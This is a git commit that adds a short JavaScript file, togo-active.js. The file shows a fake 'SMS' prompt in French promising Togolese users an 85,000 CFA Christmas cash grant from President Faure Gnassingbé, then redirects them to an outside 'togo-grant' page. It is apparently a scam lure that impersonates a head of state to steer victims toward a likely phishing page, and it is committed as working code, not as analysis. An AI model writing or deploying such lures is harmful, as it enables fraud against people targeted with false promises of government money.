d64cdead8d03162432c390a829c7bebe58b69c7c
boss-bloq <nsisboy01@gmail.com>
2024-11-29 04:12:03 -0800

    Create togo-active.js

---
+++ togo-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000CFA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000CFA du Président FAURE GNASSINGBE pour les TOGOLESE. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000CFA');
+if (password != 'RETIRER 85 000CFA') {
+location.href='https://damba-fest.org/togo-grant.html';
+}
